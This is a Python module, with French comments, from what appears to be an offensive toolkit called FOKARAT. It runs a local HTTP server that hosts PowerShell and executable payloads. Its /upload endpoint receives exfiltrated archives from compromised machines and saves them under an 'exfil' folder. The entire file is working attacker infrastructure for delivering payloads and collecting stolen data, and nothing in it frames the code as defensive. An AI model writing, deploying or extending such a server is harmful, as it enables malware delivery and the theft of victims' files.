"""
FOKARAT - Serveur HTTP local pour héberger payload.ps1 / .exe
"""
import os
import threading
import http.server
import socketserver
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import safe_input

logger = Logger()


class FokaratHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        logger.info(f"[HTTP] {self.address_string()} - {fmt % args}")

    def do_POST(self):
        """Endpoint /upload pour l'exfiltration."""
        if self.path == "/upload":
            length = int(self.headers.get("Content-Length", 0))
            data = self.rfile.read(length)
            upload_dir = "output/exfil"
            os.makedirs(upload_dir, exist_ok=True)
            import time
            filename = f"exfil_{int(time.time())}.zip"
            with open(os.path.join(upload_dir, filename), "wb") as f:
                f.write(data)
            logger.success(f"Fichier exfiltré : {filename}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()


class HTTPServer(ModuleInterface):
    def __init__(self):
        self.httpd = None
        self.thread = None

    def get_metadata(self):
        return {
            "name": "HTTP Server",
            "version": "1.0",
            "type": "server",
            "description": "Sert les payloads (ps1, exe) et reçoit les exfiltrations."
        }

    def run(self, config):
        serve_dir = config.get("output_dir", "output")
        if not os.path.exists(serve_dir):
            os.makedirs(serve_dir, exist_ok=True)

        p = safe_input(f"  [>] Port HTTP [8080] : ") or "8080"
        try:
            port = int(p)
        except ValueError:
            port = 8080

        os.chdir(serve_dir)
        handler = FokaratHTTPHandler

        try:
            self.httpd = socketserver.TCPServer(("", port), handler)
            self.thread = threading.Thread(target=self.httpd.serve_forever, daemon=True)
            self.thread.start()
            logger.success(f"Serveur HTTP démarré sur le port {port}")
            logger.info(f"Dossier servi : {os.path.abspath(serve_dir)}")
            logger.info("Ctrl+C pour arrêter.")
            try:
                while True:
                    import time
                    time.sleep(1)
            except KeyboardInterrupt:
                self.stop()
        except OSError as e:
            logger.error(f"Impossible de démarrer : {e}")
            return {"status": "error", "message": str(e)}

        return {"status": "success", "port": port}

    def stop(self):
        if self.httpd:
            self.httpd.shutdown()
            self.httpd.server_close()
            logger.info("Serveur HTTP arrêté.")